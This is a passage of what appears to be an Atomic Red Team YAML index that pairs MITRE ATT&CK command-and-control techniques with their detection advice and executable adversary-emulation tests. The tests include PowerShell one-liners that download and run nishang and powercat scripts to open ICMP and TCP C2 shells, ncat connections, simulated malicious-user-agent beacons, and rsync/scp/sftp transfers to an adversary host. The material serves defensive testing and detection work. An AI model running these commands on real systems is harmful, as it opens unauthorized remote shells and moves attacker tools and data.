        In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
    atomic_tests: []
  T1095:
    technique:
      modified: '2023-04-20T19:11:53.499Z'
      name: Non-Application Layer Protocol
      description: |-
        Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).

        ICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_contributors:
      - Ryan Becwar
      - Duane Michael
      x_mitre_deprecated: false
      x_mitre_detection: "Analyze network traffic for ICMP messages or other protocols
        that contain abnormal data or are not normally seen within or exiting the
        network.(Citation: Cisco Blog Legacy Device Attacks)\n\nAnalyze network data
        for uncommon data flows (e.g., a client sending significantly more data than
        it receives from a server). Processes utilizing the network that do not normally
        have network communication or have never been seen before are suspicious.
        Analyze packet contents to detect communications that do not follow the expected
        protocol behavior for the port that is being used.(Citation: University of
        Birmingham C2) \n\nMonitor and investigate API calls to functions associated
        with enabling and/or utilizing alternative communication channels."
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Windows
      - Linux
      - macOS
      - Network
      x_mitre_version: '2.2'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      type: attack-pattern
      id: attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b
      created: '2017-05-31T21:31:10.728Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1095
        external_id: T1095
      - source_name: University of Birmingham C2
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
      - source_name: Cisco Synful Knock Evolution
        description: Graham Holmes. (2015, October 8). Evolution of attacks on Cisco
          IOS devices. Retrieved October 19, 2020.
        url: https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices
      - source_name: Microsoft ICMP
        description: Microsoft. (n.d.). Internet Control Message Protocol (ICMP) Basics.
          Retrieved December 1, 2014.
        url: http://support.microsoft.com/KB/170292
      - source_name: Cisco Blog Legacy Device Attacks
        description: Omar Santos. (2020, October 19). Attackers Continue to Target
          Legacy Devices. Retrieved October 20, 2020.
        url: https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954
      - source_name: Wikipedia OSI
        description: Wikipedia. (n.d.). List of network protocols (OSI model). Retrieved
          December 4, 2014.
        url: http://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1095
    atomic_tests:
    - name: ICMP C2
      auto_generated_guid: '0268e63c-e244-42db-bef7-72a9e59fc1fc'
      description: |
        This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener
        refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/
      supported_platforms:
      - windows
      input_arguments:
        server_ip:
          description: The IP address of the listening server
          type: string
          default: 127.0.0.1
      executor:
        command: |
          IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
          Invoke-PowerShellIcmp -IPAddress #{server_ip}
        name: powershell
    - name: Netcat C2
      auto_generated_guid: bcf0d1c1-3f6a-4847-b1c9-7ed4ea321f37
      description: "Start C2 Session Using Ncat\nTo start the listener on a Linux
        device, type the following: \nnc -l -p <port>\n"
      supported_platforms:
      - windows
      input_arguments:
        server_port:
          description: The port for the C2 connection
          type: integer
          default: 80
        ncat_exe:
          description: The location of ncat.exe
          type: path
          default: "$env:TEMP\\T1095\\nmap-7.80\\ncat.exe"
        ncat_path:
          description: The folder path of ncat.exe
          type: path
          default: "$env:TEMP\\T1095"
        server_ip:
          description: The IP address or domain name of the listening server
          type: string
          default: 127.0.0.1
      dependency_executor_name: powershell
      dependencies:
      - description: 'ncat.exe must be available at specified location (#{ncat_exe})

          '
        prereq_command: 'if( Test-Path "#{ncat_exe}") {exit 0} else {exit 1}

          '
        get_prereq_command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          New-Item -ItemType Directory -Force -Path #{ncat_path} | Out-Null
          $parentpath = Split-Path (Split-Path "#{ncat_exe}"); $zippath = "$parentpath\nmap.zip"
          Invoke-WebRequest  "https://nmap.org/dist/nmap-7.80-win32.zip" -OutFile "$zippath"
            Expand-Archive $zippath $parentpath -Force
            $unzipPath = Join-Path $parentPath "nmap-7.80"
          if( $null -eq (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{$_.DisplayName -like "Microsoft Visual C++*"}) ) {
            Start-Process (Join-Path $unzipPath "vcredist_x86.exe")
          }
      executor:
        command: 'cmd /c #{ncat_exe} #{server_ip} #{server_port}

          '
        name: powershell
    - name: Powercat C2
      auto_generated_guid: 3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e
      description: "Start C2 Session Using Powercat\nTo start the listener on a Linux
        device, type the following: \nnc -l -p <port>\n"
      supported_platforms:
      - windows
      input_arguments:
        server_ip:
          description: The IP address or domain name of the listening server
          type: string
          default: 127.0.0.1
        server_port:
          description: The port for the C2 connection
          type: integer
          default: 80
      executor:
        command: |
          IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
          powercat -c #{server_ip} -p #{server_port}
        name: powershell
  T1001.003:
    technique:
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc
      type: attack-pattern
      created: '2020-03-15T00:40:27.503Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1001.003
        url: https://attack.mitre.org/techniques/T1001/003
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-15T00:40:27.503Z'
      name: Protocol Impersonation
      description: "Adversaries may impersonate legitimate protocols or web service
        traffic to disguise command and control activity and thwart analysis efforts.
        By impersonating legitimate protocols or web services, adversaries can make
        their command and control traffic blend in with legitimate network traffic.
        \ \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look
        like subsequent traffic is SSL/TLS encrypted, potentially interfering with
        some security tooling, or to make the traffic look like it is related with
        a trusted entity. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Analyze network data for uncommon data flows (e.g., a client
        sending significantly more data than it receives from a server). Processes
        utilizing the network that do not normally have network communication or have
        never been seen before are suspicious. Analyze packet contents to detect communications
        that do not follow the expected protocol behavior for the port that is being
        used.(Citation: University of Birmingham C2)'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
    atomic_tests: []
  T1065:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--c848fcf7-6b62-4bde-8216-b6c157d48da0
      type: attack-pattern
      created: '2017-05-31T21:30:53.408Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1065
        url: https://attack.mitre.org/techniques/T1065
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-14T18:19:53.002Z'
      name: Uncommonly Used Port
      description: Adversaries may conduct C2 communications over a non-standard port
        to bypass proxies and firewalls that have been improperly configured.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Analyze network data for uncommon data flows (e.g., a client
        sending significantly more data than it receives from a server). Processes
        utilizing the network that do not normally have network communication or have
        never been seen before are suspicious. Analyze packet contents to detect communications
        that do not follow the expected protocol behavior for the port that is being
        used. (Citation: University of Birmingham C2)'
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1090.004:
    technique:
      modified: '2023-03-30T21:01:52.356Z'
      name: Domain Fronting
      description: |-
        Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, "domainless" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).

        For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_contributors:
      - Matt Kelly, @breakersall
      x_mitre_detection: 'If SSL inspection is in place or the traffic is not encrypted,
        the Host field of the HTTP header can be checked if it matches the HTTPS SNI
        or against a blocklist or allowlist of domain names. (Citation: Fifield Blocking
        Resistent Communication through domain fronting 2015)'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      type: attack-pattern
      id: attack-pattern--ca9d3402-ada3-484d-876a-d717bd6e05f2
      created: '2020-03-14T23:29:19.581Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1090/004
        external_id: T1090.004
      - source_name: Fifield Blocking Resistent Communication through domain fronting
          2015
        description: David Fifield, Chang Lan, Rod Hynes, Percy Wegmann, and Vern
          Paxson. (2015). Blocking-resistant communication through domain fronting.
          Retrieved November 20, 2017.
        url: http://www.icir.org/vern/papers/meek-PETS-2015.pdf
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
    atomic_tests: []
  T1132:
    technique:
      modified: '2023-04-21T12:20:20.711Z'
      name: Data Encoding
      description: 'Adversaries may encode data to make the content of command and
        control traffic more difficult to detect. Command and control (C2) information
        can be encoded using a standard data encoding system. Use of data encoding
        may adhere to existing protocol specifications and includes use of ASCII,
        Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation:
        Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding)
        Some data encoding systems may also result in data compression, such as gzip.'
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_contributors:
      - Itzik Kotler, SafeBreach
      x_mitre_deprecated: false
      x_mitre_detection: 'Analyze network data for uncommon data flows (e.g., a client
        sending significantly more data than it receives from a server). Processes
        utilizing the network that do not normally have network communication or have
        never been seen before are suspicious. Analyze packet contents to detect communications
        that do not follow the expected protocol behavior for the port that is being
        used. (Citation: University of Birmingham C2)'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      type: attack-pattern
      id: attack-pattern--cc7b8c4e-9be0-47ca-b0bb-83915ec3ee2f
      created: '2017-05-31T21:31:43.540Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1132
        external_id: T1132
      - source_name: University of Birmingham C2
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
      - source_name: Wikipedia Binary-to-text Encoding
        description: Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved
          March 1, 2017.
        url: https://en.wikipedia.org/wiki/Binary-to-text_encoding
      - source_name: Wikipedia Character Encoding
        description: Wikipedia. (2017, February 19). Character Encoding. Retrieved
          March 1, 2017.
        url: https://en.wikipedia.org/wiki/Character_encoding
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1132.002:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--d467bc38-284b-4a00-96ac-125f447799fc
      type: attack-pattern
      created: '2020-03-14T23:39:50.117Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1132.002
        url: https://attack.mitre.org/techniques/T1132/002
      - url: https://en.wikipedia.org/wiki/Binary-to-text_encoding
        description: Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved
          March 1, 2017.
        source_name: Wikipedia Binary-to-text Encoding
      - url: https://en.wikipedia.org/wiki/Character_encoding
        description: Wikipedia. (2017, February 19). Character Encoding. Retrieved
          March 1, 2017.
        source_name: Wikipedia Character Encoding
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-14T23:39:50.117Z'
      name: Non-Standard Encoding
      description: 'Adversaries may encode data with a non-standard data encoding
        system to make the content of command and control traffic more difficult to
        detect. Command and control (C2) information can be encoded using a non-standard
        data encoding system that diverges from existing protocol specifications.
        Non-standard data encoding schemes may be based on or related to standard
        data encoding schemes, such as a modified Base64 encoding for the message
        body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding) (Citation:
        Wikipedia Character Encoding) '
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Analyze network data for uncommon data flows (e.g., a client
        sending significantly more data than it receives from a server). Processes
        utilizing the network that do not normally have network communication or have
        never been seen before are suspicious. Analyze packet contents to detect communications
        that do not follow the expected protocol behavior for the port that is being
        used.(Citation: University of Birmingham C2)'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      x_mitre_permissions_required:
      - User
    atomic_tests: []
  T1071.001:
    technique:
      modified: '2023-04-11T15:21:27.965Z'
      name: 'Application Layer Protocol: Web Protocols'
      description: "Adversaries may communicate using application layer protocols
        associated with web traffic to avoid detection/network filtering by blending
        in with existing traffic. Commands to the remote system, and often the results
        of those commands, will be embedded within the protocol traffic between the
        client and server. \n\nProtocols such as HTTP/S(Citation: CrowdStrike Putter
        Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic
        may be very common in environments. HTTP/S packets have many fields and headers
        in which data can be concealed. An adversary may abuse these protocols to
        communicate with systems under their control within a victim network while
        also mimicking normal, expected traffic. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_contributors:
      - TruKno
      x_mitre_deprecated: false
      x_mitre_detection: "Analyze network data for uncommon data flows (e.g., a client
        sending significantly more data than it receives from a server). Processes
        utilizing the network that do not normally have network communication or have
        never been seen before are suspicious. Analyze packet contents to detect application
        layer protocols that do not follow the expected protocol standards regarding
        syntax, structure, or any other variable adversaries could leverage to conceal
        data.(Citation: University of Birmingham C2)\n\nMonitor for web traffic to/from
        known-bad or suspicious domains. "
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      type: attack-pattern
      id: attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161
      created: '2020-03-15T16:13:46.151Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1071/001
        external_id: T1071.001
      - source_name: CrowdStrike Putter Panda
        description: 'Crowdstrike Global Intelligence Team. (2014, June 9). CrowdStrike
          Intelligence Report: Putter Panda. Retrieved January 22, 2016.'
        url: http://cdn0.vox-cdn.com/assets/4589853/crowdstrike-intelligence-report-putter-panda.original.pdf
      - source_name: University of Birmingham C2
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
      - source_name: Brazking-Websockets
        description: Shahar Tavor. (n.d.). BrazKing Android Malware Upgraded and Targeting
          Brazilian Banks. Retrieved March 24, 2023.
        url: https://securityintelligence.com/posts/brazking-android-malware-upgraded-targeting-brazilian-banks/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1071.001
    atomic_tests:
    - name: Malicious User Agents - Powershell
      auto_generated_guid: 81c13829-f6c9-45b8-85a6-053366d55297
      description: "This test simulates an infected host beaconing to command and
        control. Upon execution, no output will be displayed. \nUse an application
        such as Wireshark to record the session and observe user agent strings and
        responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n"
      supported_platforms:
      - windows
      input_arguments:
        domain:
          description: Default domain to simulate against
          type: string
          default: www.google.com
      executor:
        command: |
          Invoke-WebRequest #{domain} -UserAgent "HttpBrowser/1.0" | out-null
          Invoke-WebRequest #{domain} -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
          Invoke-WebRequest #{domain} -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
          Invoke-WebRequest #{domain} -UserAgent "*<|>*" | out-null
        name: powershell
    - name: Malicious User Agents - CMD
      auto_generated_guid: dc3488b0-08c7-4fea-b585-905c83b48180
      description: "This test simulates an infected host beaconing to command and
        control. Upon execution, no out put will be displayed. \nUse an application
        such as Wireshark to record the session and observe user agent strings and
        responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n"
      supported_platforms:
      - windows
      input_arguments:
        domain:
          description: Default domain to simulate against
          type: string
          default: www.google.com
        curl_path:
          description: path to curl.exe
          type: path
          default: C:\Windows\System32\Curl.exe
      dependency_executor_name: powershell
      dependencies:
      - description: "Curl must be installed on system \n"
        prereq_command: 'if (Test-Path #{curl_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          Invoke-WebRequest "https://curl.haxx.se/windows/dl-7.71.1/curl-7.71.1-win32-mingw.zip" -Outfile $env:temp\curl.zip
          Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
          Copy-Item $env:temp\curl\curl-7.71.1-win32-mingw\bin\curl.exe #{curl_path}
          Remove-Item $env:temp\curl
          Remove-Item $env:temp\curl.zip
      executor:
        command: |
          #{curl_path} -s -A "HttpBrowser/1.0" -m3 #{domain} >nul 2>&1
          #{curl_path} -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >nul 2>&1
          #{curl_path} -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >nul 2>&1
          #{curl_path} -s -A "*<|>*" -m3 #{domain} >nul 2>&1
        name: command_prompt
    - name: Malicious User Agents - Nix
      auto_generated_guid: 2d7c471a-e887-4b78-b0dc-b0df1f2e0658
      description: |
        This test simulates an infected host beaconing to command and control.
        Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
      supported_platforms:
      - linux
      - macos
      input_arguments:
        domain:
          description: Default domain to simulate against
          type: string
          default: www.google.com
      executor:
        command: |
          curl -s -A "HttpBrowser/1.0" -m3 #{domain}
          curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}
          curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}
          curl -s -A "*<|>*" -m3 #{domain}
        name: sh
  T1105:
    technique:
      modified: '2023-04-14T19:27:57.370Z'
      name: Ingress Tool Transfer
      description: "Adversaries may transfer tools or other files from an external
        system into a compromised environment. Tools or files may be copied from an
        external adversary-controlled system to the victim network through the command
        and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095).
        Once present, adversaries may also transfer/spread tools between victim devices
        within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)).
        \n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s
        as well as native or otherwise present tools on the victim system.(Citation:
        PTSecurity Cobalt Dec 2016)\n\nOn Windows, adversaries may use various utilities
        to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160),
        and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such
        as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>.
        On Linux and macOS systems, a variety of utilities also exist, such as `curl`,
        `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_contributors:
      - John Page (aka hyp3rlinx), ApparitionSec
      - Mark Wee
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as [ftp](https://attack.mitre.org/software/S0095), that does not normally occur may also be suspicious.

        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Specifically, for the finger utility on Windows and Linux systems, monitor command line or terminal execution for the finger command. Monitor network activity for TCP port 79, which is used by the finger utility, and Windows <code>netsh interface portproxy</code> modifications to well-known ports such as 80 and 443. Furthermore, monitor file system for the download/creation and execution of suspicious files, which may indicate adversary-downloaded payloads. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '2.2'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Connection Creation'
      - 'Network Traffic: Network Traffic Content'
      - 'File: File Creation'
      type: attack-pattern
      id: attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add
      created: '2017-05-31T21:31:16.408Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1105
        external_id: T1105
      - source_name: University of Birmingham C2
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
      - source_name: t1105_lolbas
        description: LOLBAS. (n.d.). LOLBAS Mapped to T1105. Retrieved March 11, 2022.
        url: https://lolbas-project.github.io/#t1105
      - source_name: PTSecurity Cobalt Dec 2016
        description: Positive Technologies. (2016, December 16). Cobalt Snatch. Retrieved
          October 9, 2018.
        url: https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Cobalt-Snatch-eng.pdf
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1105
    atomic_tests:
    - name: rsync remote file copy (push)
      auto_generated_guid: 0fc6e977-cb12-44f6-b263-2824ba917409
      description: 'Utilize rsync to perform a remote file copy (push)

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        remote_path:
          description: Remote path to receive rsync
          type: path
          default: "/tmp/victim-files"
        remote_host:
          description: Remote host to copy toward
          type: string
          default: victim-host
        local_path:
          description: Path of folder to copy
          type: path
          default: "/tmp/adversary-rsync/"
        username:
          description: User account to authenticate on remote host
          type: string
          default: victim
      executor:
        command: 'rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}

          '
        name: bash
    - name: rsync remote file copy (pull)
      auto_generated_guid: 3180f7d5-52c0-4493-9ea0-e3431a84773f
      description: 'Utilize rsync to perform a remote file copy (pull)

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        remote_path:
          description: Path of folder to copy
          type: path
          default: "/tmp/adversary-rsync/"
        remote_host:
          description: Remote host to copy from
          type: string
          default: adversary-host
        local_path:
          description: Local path to receive rsync
          type: path
          default: "/tmp/victim-files"
        username:
          description: User account to authenticate on remote host
          type: string
          default: adversary
      executor:
        command: 'rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}

          '
        name: bash
    - name: scp remote file copy (push)
      auto_generated_guid: 83a49600-222b-4866-80a0-37736ad29344
      description: 'Utilize scp to perform a remote file copy (push)

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        remote_path:
          description: Remote path to receive scp
          type: path
          default: "/tmp/victim-files/"
        local_file:
          description: Path of file to copy
          type: path
          default: "/tmp/adversary-scp"
        remote_host:
          description: Remote host to copy toward
          type: string
          default: victim-host
        username:
          description: User account to authenticate on remote host
          type: string
          default: victim
      executor:
        command: 'scp #{local_file} #{username}@#{remote_host}:#{remote_path}

          '
        name: bash
    - name: scp remote file copy (pull)
      auto_generated_guid: b9d22b9a-9778-4426-abf0-568ea64e9c33
      description: 'Utilize scp to perform a remote file copy (pull)

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        remote_host:
          description: Remote host to copy from
          type: string
          default: adversary-host
        local_path:
          description: Local path to receive scp
          type: path
          default: "/tmp/victim-files/"
        remote_file:
          description: Path of file to copy
          type: path
          default: "/tmp/adversary-scp"
        username:
          description: User account to authenticate on remote host
          type: string
          default: adversary
      executor:
        command: 'scp #{username}@#{remote_host}:#{remote_file} #{local_path}

          '
        name: bash
    - name: sftp remote file copy (push)
      auto_generated_guid: f564c297-7978-4aa9-b37a-d90477feea4e
      description: 'Utilize sftp to perform a remote file copy (push)

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        remote_path:
          description: Remote path to receive sftp
          type: path
          default: "/tmp/victim-files/"
        local_file:
          description: Path of file to copy
          type: path
          default: "/tmp/adversary-sftp"
        remote_host:
          description: Remote host to copy toward
          type: string
          default: victim-host
        username:
          description: User account to authenticate on remote host
          type: string
          default: victim
      executor:
        command: 'sftp #{username}@#{remote_host}:#{remote_path} <<< $''put #{local_file}''

          '
        name: bash
    - name: sftp remote file copy (pull)
      auto_generated_guid: '0139dba1-f391-405e-a4f5-f3989f2c88ef'
      description: 'Utilize sftp to perform a remote file copy (pull)

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        remote_host:
          description: Remote host to copy from
          type: string
          default: adversary-host
        local_path:
